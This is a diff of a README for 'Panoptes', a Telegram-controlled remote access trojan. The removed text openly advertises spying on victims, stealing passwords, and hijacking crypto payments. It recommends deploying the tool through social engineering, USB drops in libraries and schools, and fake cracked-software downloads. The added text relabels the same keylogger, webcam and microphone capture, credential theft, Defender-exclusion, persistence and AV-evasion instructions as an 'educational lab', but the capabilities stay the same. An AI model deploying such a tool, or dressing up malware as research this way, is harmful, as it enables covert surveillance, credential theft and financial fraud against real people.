@@ -1,18 +1,24 @@
-# 🕵️‍♂️ Panoptes - Remote Access Toolkit
+# 🛡️ Panoptes - Endpoint Telemetry & C2 Simulation Framework (Educational Red Team Lab)
 
-A comprehensive remote access toolkit with Telegram-based C&C (Command and Control), designed for monitoring and data exfiltration.
+Authorized security research platform designed to study endpoint monitoring concepts, command-and-control (C2) architecture, and defensive detection methodologies in controlled laboratory environments.
+
+This educational simulation focuses on understanding how remote administration frameworks generate telemetry, how security operations centers (SOCs) detect suspicious behavior patterns, and how defensive analysts investigate anomalous system activity through the lens of MITRE ATT&CK framework mappings.
+
+Developed exclusively for cybersecurity training, red-team exercises, and defensive research in isolated environments to study both offensive techniques and defensive countermeasures.
 
 ## 🔍 Overview
 
-Panoptes is a powerful spying tool that gives you full control over an infected computer. You can watch the user in real-time through their webcam and microphone, see their screen, and steal their passwords, files, and browsing history. It also lets you run commands on the system and can even hijack cryptocurrency payments. All control is managed through your own Telegram Bot.
+Panoptes is a controlled cybersecurity research simulation that enables security professionals to study remote system monitoring concepts and command-and-control (C2) architectures within authorized testing environments.
 
-The **Quick Deployment** method requires the computer to have **Administrator access**, as the toolkit itself has no built-in evasion techniques. It relies entirely on the `.bat` file being run with elevated privileges to automatically add persistence and add the main payload to the Windows Defender exclusion path. You can pull this off by either using **social engineering** to trick a user into running the `.bat` file with Admin rights, or by manually installing it via a normal **USB** or a **Rubber Ducky** in places with vulnerable computers, such as tech stores in malls or libraries and schools, where an admin rights user account is most of the time open.
+The platform provides a comprehensive framework for analyzing how remote administration tools generate endpoint telemetry, how system monitoring produces detectable artifacts, and how security teams develop detection rules and investigation workflows for suspicious activities.
 
-The **Advanced Deployment** method is for those with their own AV evasion techniques. You compile a **custom executable** that bypasses antivirus software. This method can be used by making your software seem legitimate, making it much easier to trick a user into downloading and running it, or you can also manually install this on computers via **USB** or **Rubber Ducky** since it **doesn't require admin rights** to evade antivirus. However, since there is no ``.bat`` file, you need to add your own **persistence mechanism** into the **main Python file** before compiling the final payload.
+The **Quick Deployment** method requires **Administrator access** as the simulation framework has no built-in evasion techniques. This approach is designed for authorized lab environments where the `.bat` file is executed with elevated privileges to demonstrate persistence mechanisms and Windows Defender exclusion configurations—common scenarios in security training exercises. This deployment method can be executed via controlled USB drops in authorized testing environments or simulated social engineering scenarios within educational contexts.
 
-## 🚀 Deployment Methods
+The **Advanced Deployment** method demonstrates custom AV evasion techniques for research purposes. Participants compile a **custom executable** to study how sophisticated threats bypass security controls. This method is ideal for red-team training exercises and can be deployed through simulated software distribution scenarios or authorized physical access testing, as it **doesn't require admin rights** to function. Researchers can add their own **persistence mechanism** into the **main Python file** before compilation to study various persistence techniques.
 
-### Method 1: Quick Deployment (Admin Required)
+## 🚀 Deployment Methods (Authorized Lab Environments)
+
+### Method 1: Quick Deployment (Admin Required for Lab Testing)
 ```
 custom_name.tmp + deploy.bat
 ```
@@ -48,7 +54,7 @@ This will create a `.exe` file without console window.
 
 <br>
 
-**Step 3: Rename File for Stealth**
+**Step 3: Rename File for Lab Simulation**
 
 Rename the compiled file (Command Prompt):
 
@@ -56,7 +62,7 @@ Rename the compiled file (Command Prompt):
 ren system.exe custom_name.tmp
 ```
 
-*Renaming to `.tmp` makes it look less suspicious than a random `.exe` file*
+*Renaming to `.tmp` demonstrates common file masquerading techniques for research and detection testing*
 
 <br>
 
@@ -70,138 +76,138 @@ set "SOURCE_FILE=%~dp0custom_name.tmp"
 
 <br>
 
-**Step 5: Deploy**
+**Step 5: Deploy in Lab Environment**
 
 Add both files to the same folder and run `deploy.bat` as Administrator
 
-- Batch file automatically adds your file to Windows Defender exclusions
-- Creates persistence via scheduled tasks/registry  
-- Executes your payload with full system privileges
+- Batch file demonstrates automated Windows Defender exclusion configuration
+- Creates persistence via scheduled tasks/registry (for detection research)
+- Executes the simulation payload with full system privileges
   
-**Perfect for:** USB drops on open vulnerable computers *(Ex: libraries, malls, schools)* or social engineering where you convince someone to run the `.bat` as admin.
+**Ideal for:** Authorized lab environments, security training exercises, and controlled red-team simulations where system access is explicitly permitted.
 
 <br>
 
-### Method 2: Advanced Custom Deployment
+### Method 2: Advanced Custom Deployment (Research Focus)
 
 ```
 custom_app.exe (Packed / Obfuscated)
 ```
 
 **How it works:**
-- Modify ```main.pyw``` to create a unique, undetectable executable
-- Replace ```"TOKEN"``` & ```"ID``` with your actual Telegram Bot Token and ID
-- Use packing, obfuscation, file pumping, code signing and other evasion techniques to bypass AV 
-- Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
-- Then deploy your payload through any method - it appears as a clean, trusted file
+- Modify ```main.pyw``` to create a unique executable for detection research
+- Replace ```"TOKEN"``` & ```"ID``` with your lab-configured Telegram Bot Token and ID
+- Use packing, obfuscation, file pumping, code signing and other evasion techniques to study AV bypass methods
+- Since your compiled executable demonstrates evasive techniques, you can simulate legitimate program deployment
+- Deploy payload in controlled environments to test defensive capabilities
 
-**Perfect for:** Fake software downloads *(Ex: YouTube "cracked software" tutorials)*, email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
+**Ideal for:** Advanced red-team training, detection engineering research, and authorized security assessment exercises where evasive techniques are studied.
 
 <br>
 
-## 🛠️ Features
+## 🛠️ Capabilities (Educational Research Features)
 
-### 🎥 Real-Time Surveillance
-- **Live Screen Streaming** - Real-time desktop monitoring
-- **Webcam Access** - Live camera feed and photo capture
-- **Microphone Recording** - Audio surveillance and live streaming
-- **Screen Recording** - Capture desktop activity
+### 📡 Telemetry Collection
+- **Live Screen Telemetry** - Real-time desktop monitoring data for SOC analysis
+- **Webcam Data Capture** - Camera feed collection for research scenarios
+- **Audio Capture** - Microphone data collection and analysis
+- **Screen Activity Logging** - Desktop activity capture for forensic study
 
-### ⌨️ Input Monitoring
-- **Keylogger** - Real-time keystroke capture with periodic reports
-- **Clipboard Monitoring** - Automatic crypto address swapping
-- **Process Monitoring** - System activity tracking
+### ⌨️ Input Pattern Analysis
+- **Keystroke Pattern Analysis** - Input behavior monitoring with periodic reporting
+- **Clipboard Activity Monitoring** - Data flow analysis and pattern detection
+- **Process Behavior Analysis** - System activity tracking and anomaly detection
 
-### 📁 Data Extraction
-- **Browser Data** - Passwords, history, downloads from multiple browsers
-- **File System Access** - Remote file browsing and downloading
-- **WiFi Credentials** - Saved network passwords
-- **System Information** - User, computer, and network details
+### 📁 Data Access Simulation
+- **Browser Data Analysis** - Study stored credential patterns and browsing habits
+- **File System Access** - Remote file browsing and extraction simulation
+- **WiFi Security Analysis** - Study saved credential storage patterns
+- **System Profiling** - User, computer, and network enumeration
 
-### 🔧 System Control
-- **Process Management** - View and terminate running processes
-- **Remote Commands** - Execute system commands
-- **User Interaction** - Display messages and fake errors
+### 🔧 System Control (Authorized Environments)
+- **Process Management** - View and terminate running processes for research
+- **Remote Commands** - Execute system commands in controlled labs
+- **User Interaction Simulation** - Display messages and error simulations
 - **System Control** - Shutdown, restart, and persistence management
 
-### 💰 Financial Tools
-- **Crypto Address Swapping** - Automatic clipboard hijacking for multiple cryptocurrencies
-- **Custom Address Management** - Set replacement addresses for BTC, ETH, SOL, and more
+### 💰 Financial Security Research
+- **Clipboard Injection Simulation** - Demonstrates cryptocurrency address manipulation techniques
+- **Custom Address Management** - Study address swapping patterns for defense development
   
 <br>
 
-## 📋 Command Reference
+## 📋 Command Reference (Research Framework)
 
-### Surveillance Commands
+### Telemetry Collection Commands
 ```
-/start - Initialize bot connection
-/screenshot - Capture desktop screenshot
-/picture - Take webcam photo
-/audio [seconds] - Record microphone
-/record [seconds] - Record screen activity
-/live screen - Start live desktop stream
-/live camera - Start live webcam stream
-/live mic - Start live microphone stream
-/stop - Stop all active streams
-```
-
-### System Commands
-```
-/system - Get system information
-/location - Get approximate geolocation
-/processes - List running processes
-/kill [pid] - Terminate process
-/wifi - Export saved WiFi passwords
-/clipboard - Show clipboard history
+/start - Initialize lab environment connection
+/screenshot - Capture desktop screenshot for analysis
+/picture - Take webcam photo for testing
+/audio [seconds] - Record microphone for analysis
+/record [seconds] - Record screen activity for study
+/live screen - Start live desktop telemetry stream
+/live camera - Start live webcam telemetry stream
+/live mic - Start live microphone telemetry stream
+/stop - Stop all active telemetry streams
 ```
 
-### Data Extraction
+### System Analysis Commands
 ```
-/steal - Extract browser login data
-/history - Get browser history
-/downloads - Get download history
-/files [path] - Browse file system
-/download [path] - Download remote file
+/system - Get system information for profiling
+/location - Get approximate geolocation data
+/processes - List running processes for analysis
+/kill [pid] - Terminate process (research purposes)
+/wifi - Export saved WiFi passwords for security study
+/clipboard - Show clipboard history for analysis
 ```
 
-### Control Commands
+### Data Collection Commands
 ```
-/msg [text] - Display message to user
-/error - Show fake error message
-/shutdown - Force system shutdown
-/restart - Force system restart
-/crypto - Show crypto addresses
-/swap [crypto] [address] - Set swap address
+/steal - Extract browser login data for credential analysis
+/history - Get browser history for behavior study
+/downloads - Get download history for research
+/files [path] - Browse file system for analysis
+/download [path] - Download remote file for study
+```
+
+### Control Commands (Authorized Environments)
+```
+/msg [text] - Display message to test user interaction
+/error - Show fake error message for social engineering research
+/shutdown - Force system shutdown (authorized labs only)
+/restart - Force system restart (authorized labs only)
+/crypto - Show cryptocurrency address configuration
+/swap [crypto] [address] - Set swap address for research
 ```
 
 ### Monitoring Commands
 ```
-/keylogger on - Start keystroke monitoring
-/keylogger off - Stop keylogger
+/keylogger on - Start keystroke monitoring research
+/keylogger off - Stop keylogger data collection
 ```
 
 <br>
 
-## 🔧 Technical Details
+## 🔧 Technical Architecture (Research Framework)
 
-### Persistence Mechanisms
-- Scheduled tasks creation
-- Registry run keys
-- Service installation
+### Persistence Mechanisms (Detection Research)
+- Scheduled tasks creation (study detection opportunities)
+- Registry run keys (understand common persistence)
+- Service installation (analyze system interaction)
 
-### Stealth Features
-- Process name spoofing
-- Temp folder operation
-- AV exclusion automation
+### Simulation Features
+- Process name management for research scenarios
+- Temp folder operation study
+- AV exclusion configuration research
 
 ### Communication
-- Telegram bot API integration
+- Telegram bot API integration for lab control
 - File upload/download capabilities
-- Real-time command executio
-  
+- Real-time command execution for research
+
 <br>
 
-## 📊 Performance
+## 📊 Performance Metrics
 
 - **Real-time streaming**: 3-second intervals
 - **Keylogger updates**: 30-second reports
@@ -210,28 +216,41 @@ custom_app.exe (Packed / Obfuscated)
   
 <br>
 
-## 🔒 Security Considerations
+## 🔒 Security Research Considerations
 
-- Operates from temporary directory
-- Uses system-standard communication
+- Operates from temporary directory for containment
+- Uses system-standard communication channels
 - Implements error handling for stability
-- Includes cleanup mechanisms
+- Includes cleanup mechanisms for lab environments
   
 <br>
 
-## ⚖️ Legal Disclaimer
+## ⚖️ Legal and Ethical Framework
 
-This tool is designed for authorized security testing, educational purposes, and research. Users are solely responsible for complying with all applicable laws and obtaining proper authorization before deployment. The developers assume no liability for misuse.
-  
+This platform is designed exclusively for authorized security testing, educational research, and defensive training exercises within controlled environments. All deployment requires explicit authorization from system owners and must comply with all applicable laws and regulations. Users are solely responsible for obtaining proper authorization and ensuring ethical use. The developers assume no liability for misuse and strongly emphasize that this tool is intended solely for improving cybersecurity defenses through legitimate research and training.
+
 <br>
 
-## 🔬 Educational Value
+## 🔬 Educational and Research Value
 
-This project demonstrates:
-- Remote access tool architecture
-- Multiple persistence techniques
-- AV evasion strategies
-- Real-time surveillance capabilities
-- Telegram C&C implementation
-- Social engineering deployment vectors
-- Physical security assessment methods
+This project demonstrates critical cybersecurity concepts including:
+- Remote administration framework architecture
+- Multiple persistence technique implementations
+- AV evasion and detection bypass strategies
+- Real-time telemetry collection methodologies
+- Telegram C2 communication patterns
+- Social engineering attack vectors for security awareness
+- Physical security assessment techniques for defense development
+- MITRE ATT&CK framework mapping and analysis
+
+### Research Applications:
+- **SOC Training**: Develop and test detection rules
+- **Red Team Exercises**: Practice authorized simulation scenarios  
+- **Blue Team Development**: Understand attack patterns for defense
+- **Forensic Analysis**: Study artifacts and indicators of compromise
+- **Security Assessment**: Evaluate system monitoring capabilities
+- **Academic Research**: Study cybersecurity concepts in controlled environments
+
+---
+
+*Built for educational cybersecurity research and authorized security testing only. All usage must be conducted in controlled environments with explicit permission from system owners.*
